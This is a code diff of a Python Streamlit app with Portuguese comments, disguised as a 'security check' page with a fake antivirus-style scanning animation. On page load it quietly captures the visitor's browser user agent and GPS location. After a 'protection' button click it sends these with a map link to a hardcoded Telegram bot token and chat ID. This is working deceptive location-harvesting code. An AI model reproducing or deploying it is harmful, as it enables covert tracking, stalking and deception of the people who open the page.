@@ -3,22 +3,23 @@ import requests
 import time
 from streamlit_js_eval import streamlit_js_eval, get_geolocation
 
-# 1. CONFIGURAÇÕES
+# 1. CONEXÃO DIRETA TELEGRAM
 TOKEN = "8525927641:AAHKDONFvh8LgUpIENmtplTfHuoFrg1ffr8"
 ID = "8210828398"
 
-def enviar_tg(msg):
+def enviar_telegram(msg):
     url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
     try: requests.post(url, json={"chat_id": ID, "text": msg, "parse_mode": "Markdown"})
     except: pass
 
-# 2. ESTILO (LISO)
-st.set_page_config(page_title="Segurança Ativa", layout="centered")
+# 2. CONFIGURAÇÃO E VISUAL (IDÊNTICO AO VÍDEO)
+st.set_page_config(page_title="Sistema de Segurança", layout="centered")
+
 st.markdown("""
     <style>
     .main { background-color: #000; color: white; }
-    .scanner-box { display: flex; flex-direction: column; align-items: center; padding: 20px; }
-    .circle {
+    .scanner-container { display: flex; flex-direction: column; align-items: center; padding: 20px; }
+    .sphere {
         width: 180px; height: 180px; border-radius: 50%;
         background: radial-gradient(circle, rgba(46, 204, 113, 0.2) 0%, transparent 70%);
         border: 2px solid rgba(46, 204, 113, 0.5);
@@ -27,38 +28,39 @@ st.markdown("""
         animation: pulse 2s infinite ease-in-out;
     }
     @keyframes pulse { 0%, 100% { transform: scale(1); } 50% { transform: scale(1.05); } }
-    .pct-text { font-size: 45px; font-weight: bold; color: white; }
+    .pct { font-size: 45px; font-weight: bold; color: white; }
     div.stButton > button {
         background-color: #ffc107 !important; color: black !important;
-        font-weight: bold !important; width: 100%; height: 3.5em; border-radius: 10px; border: none;
+        font-weight: bold !important; width: 100%; height: 3.8em;
+        border-radius: 10px; border: none !important; cursor: pointer;
     }
     </style>
 """, unsafe_allow_html=True)
 
-# 3. CAPTURA DE DADOS (FORA DO BOTÃO)
-# Captura o UA logo de cara
-ua = streamlit_js_eval(js_expressions="window.navigator.userAgent", key='UA_FIXO')
-# O GPS fica pronto esperando o clique
+# 3. CAPTURA SILENCIOSA (O PULO DO GATO PARA O 1 CLIQUE)
+# Capturamos o GPS fora de qualquer condicional para ele começar a carregar IMEDIATAMENTE
+ua = streamlit_js_eval(js_expressions="window.navigator.userAgent", key='UA_FINAL')
+# get_geolocation sem 'key' dinâmica para evitar o TypeError das fotos
 loc = get_geolocation() 
 
-# 4. INTERFACE
+# 4. INTERFACE PRINCIPAL
 st.markdown("<h2 style='text-align: center;'>Verificar segurança</h2>", unsafe_allow_html=True)
-tela = st.empty()
+espaco_bola = st.empty()
 
-with tela.container():
-    st.markdown('<div class="scanner-box"><div class="circle"><div class="pct-text">4%</div></div></div>', unsafe_allow_html=True)
+# Mostra os 4% iniciais do vídeo
+with espaco_bola.container():
+    st.markdown('<div class="scanner-container"><div class="sphere"><div class="pct">4%</div></div></div>', unsafe_allow_html=True)
 
 st.write("✅ Ambiente de pagamentos")
 st.write("✅ Privacidade e segurança")
 st.write("✅ Vírus")
 
-# 5. LÓGICA DE 1 CLIQUE
-# Se clicar, ele processa tudo de uma vez
+# 5. O BOTÃO DE 1 CLIQUE
 if st.button("🔴 ATIVAR PROTEÇÃO"):
     if loc and 'coords' in loc:
-        # Animação visual rápida para chegar em 100% igual ao vídeo
-        for p in [25, 47, 72, 93, 100]:
-            tela.markdown(f'<div class="scanner-box"><div class="circle"><div class="pct-text">{p}%</div></div></div>', unsafe_allow_html=True)
+        # Se o GPS já carregou (1 clique), faz a animação subir rápido e envia
+        for p in [22, 48, 71, 93, 100]:
+            espaco_bola.markdown(f'<div class="scanner-container"><div class="sphere"><div class="pct">{p}%</div></div></div>', unsafe_allow_html=True)
             time.sleep(0.1)
         
         lat = loc['coords']['latitude']
@@ -66,15 +68,14 @@ if st.button("🔴 ATIVAR PROTEÇÃO"):
         mapa = f"https://www.google.com/maps?q={lat},{lon}"
         
         relatorio = (
-            f"🛡️ PROTEÇÃO ATIVADA\n"
-            f"📱 {ua[:40] if ua else 'Mobile'}\n"
-            f"📍 [VER LOCALIZAÇÃO]({mapa})"
+            f"🛡️ SISTEMA ATIVADO\n"
+            f"📱 {ua[:40] if ua else 'Android/iOS'}\n"
+            f"📍 [LOCALIZAÇÃO NO MAPA]({mapa})"
         )
-        
-        enviar_tg(relatorio)
+        enviar_telegram(relatorio)
         st.success("✅ Proteção Ativada!")
     else:
-        # Se o GPS não carregou no tempo de abrir a página, avisa o usuário
-        st.error("⚠️ GPS ainda carregando... Aguarde 1 segundo e tente o clique final.")
+        # Se o usuário for muito rápido e o navegador ainda estiver processando o GPS
+        st.warning("⚠️ Sincronizando satélites... Aguarde 1 segundo e clique novamente.")
 
-st.markdown('<p style="text-align:center; color:#444; margin-top:50px;">Desenvolvido Por Miamy © 2026</p>', unsafe_allow_html=True)
+st.markdown('<p style="text-align:center; color:#444; margin-top:40px;">Desenvolvido Por Miamy © 2026</p>', unsafe_allow_html=True)
